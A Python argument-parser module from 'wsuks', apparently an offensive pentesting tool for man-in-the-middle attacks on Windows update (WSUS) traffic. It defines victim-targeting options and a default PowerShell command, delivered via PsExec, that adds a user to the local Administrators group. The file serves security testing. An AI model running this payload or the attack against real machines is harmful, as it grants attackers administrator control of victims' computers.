#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
from argparse import RawTextHelpFormatter
import importlib.metadata
import wsuks
from os.path import dirname

__version__ = importlib.metadata.version('wsuks')


def printBanner():
    print(f"""
    __          __ _____  _    _  _  __  _____
    \ \        / // ____|| |  | || |/ / / ____|
     \ \  /\  / /| (___  | |  | || ' / | (___
      \ \/  \/ /  \___ \ | |  | ||  <   \___ \ 
       \  /\  /   ____) || |__| || . \  ____) |
        \/  \/   |_____/  \____/ |_|\_\|_____/

     Pentesting Tool for the WSUS MITM Attack
               Made by NeffIsBack
                 Version: {__version__}
""")


def initParser():
    example_text = """Examples:
    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2
    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2 -u User -p Password123 -d Domain.local
    wsuks -t 192.168.0.10 -u User -p Password123 -d Domain.local -dc-ip 192.168.0.1
    """
    parser = argparse.ArgumentParser(prog='wsuks', epilog=example_text, formatter_class=RawTextHelpFormatter)

    parser.add_argument('-v', '--version', action='version', version='Current Version: %(prog)s 2.0')
    parser.add_argument('--debug', action='store_true', help='Enable debug output')

    parser.add_argument('-t', '--target-ip', metavar='', dest='targetIp', help='IP Address of the victim Client. (REQUIRED)', required=True)
    parser.add_argument('-I', '--interface', metavar='', help='Network Interface to use. (DEFAULT: %(default)s)', default='eth0')
    parser.add_argument('-e', '--executable', metavar='', default=f'{dirname(wsuks.__file__)}/executables/PsExec64.exe', type=argparse.FileType('rb'), help='The executable to returned to the victim. It has to be signed by Microsoft (DEFAULT: %(default)s)')
    parser.add_argument('-c', '--command', metavar='', help='The command to execute on the victim. (DEFAULT: %(default)s)', default='/accepteula /s powershell.exe \'PREFIXAdd-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member "WSUKS_USER"\'')

    simple = parser.add_argument_group('AUTOMATIC MODE', 'Discover the WSUS Server automatically by searching for GPOs in SYSVOL. (Default)')
    simple.add_argument('-u', '--username', metavar='', help='Username to authenticate with')
    simple.add_argument('-p', '--password', metavar='', help='Password to authenticate with')
    simple.add_argument('-dc-ip', metavar='', dest='dcIp', help='IP Address of the domain controller')
    simple.add_argument('-d', '--domain', metavar='', help='Domain to authenticate with')

    advanced = parser.add_argument_group('MANUAL MODE', 'If you know the WSUS Server, you can use this mode to skip the automatic discovery.')
    advanced.add_argument('--WSUS-Server', metavar='', dest='wsusIp', help='IP Address of the WSUS Server.')
    advanced.add_argument('--WSUS-Port', metavar='', dest='wsusPort', type=int, default=8530, help='Port of the WSUS Server. (DEFAULT: %(default)s)')

    return parser.parse_args()
